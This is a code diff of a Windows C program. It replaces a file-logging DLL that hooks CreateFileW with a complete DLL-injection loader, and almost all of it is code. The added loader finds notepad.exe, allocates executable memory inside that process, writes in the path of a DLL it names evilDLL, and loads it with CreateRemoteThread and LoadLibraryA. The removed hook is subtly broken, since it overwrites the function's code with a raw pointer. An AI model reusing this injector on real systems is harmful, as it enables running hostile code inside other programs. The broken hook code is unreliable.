@@ -1,52 +1,55 @@
-#include <Windows.h>
-#include <iostream>
-#include <string>
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <TlHelp32.h>
 
-
-typedef HANDLE(WINAPI* CREATEFILEW)(
-    LPCWSTR lpFileName,
-    DWORD dwDesiredAccess,
-    DWORD dwShareMode,
-    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
-    DWORD dwCreationDisposition,
-    DWORD dwFlagsAndAttributes,
-    HANDLE hTemplateFile
-);
-
-CREATEFILEW OriginalCreateFileW = NULL;
-
-HANDLE WINAPI MyCreateFileW(
-    LPCWSTR lpFileName,
-    DWORD dwDesiredAccess,
-    DWORD dwShareMode,
-    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
-    DWORD dwCreationDisposition,
-    DWORD dwFlagsAndAttributes,
-    HANDLE hTemplateFile
-)
-{
-    std::wcout << "CreateFileW: " << lpFileName << std::endl;
-    return OriginalCreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
-}
-
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
-{
-    switch (ul_reason_for_call) //entry point for dll files when the system terminates or loads new process or thread
-    {
-    case DLL_PROCESS_ATTACH: //dll loaded to the virtual address space
-        OriginalCreateFileW = (CREATEFILEW)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "CreateFileW");
-        if (OriginalCreateFileW)
-        {
-            // Replace the original CreateFileW with our custom function
-            FARPROC pMyCreateFileW = &MyCreateFileW;
-            DWORD oldProtect;
-            VirtualProtect(OriginalCreateFileW, sizeof(pMyCreateFileW), PAGE_EXECUTE_READWRITE, &oldProtect);
-            memcpy(OriginalCreateFileW, &pMyCreateFileW, sizeof(pMyCreateFileW));
-            VirtualProtect(OriginalCreateFileW, sizeof(pMyCreateFileW), oldProtect, &oldProtect);
+int getPIDbyProcName(const char* procName) {
+    int pid = 0;
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+    if (Process32First(hSnap, &pe32) != FALSE) {
+        while (pid == 0 && Process32Next(hSnap, &pe32) != FALSE) {
+            if (strcmp(pe32.szExeFile, procName) == 0) {
+                pid = pe32.th32ProcessID;
+            }
         }
-        break;
-    case DLL_PROCESS_DETACH: //could not load the dll into virtual space
-        break;
     }
-    return true;
+    CloseHandle(hSnap);
+    return pid;
 }
+
+char evilDLL[] = ".\\injection.dll";
+unsigned int evilLen = sizeof(evilDLL) + 1;
+
+typedef LPVOID memory_buffer;
+
+
+
+int main(int argc, char* argv[]) {
+  HANDLE pHandle; // process handle
+  HANDLE remoteThread; // remote thread
+  memory_buffer rb; // remote buffer
+
+  // handle to kernel32 and pass it to GetProcAddress
+  HMODULE hKernel32 = GetModuleHandle("Kernel32");
+  void *lb = GetProcAddress(hKernel32, "LoadLibraryA");
+
+  int pid = getPIDbyProcName("notepad.exe");
+
+  pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+
+  // allocate memory buffer for remote process
+  rb = VirtualAllocEx(pHandle, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+
+  // "copy" evil DLL between processes
+  WriteProcessMemory(pHandle, rb, evilDLL, evilLen, NULL);
+
+  // our process start new thread
+  remoteThread = CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
+  CloseHandle(pHandle);
+
+    return 0;
+}
+
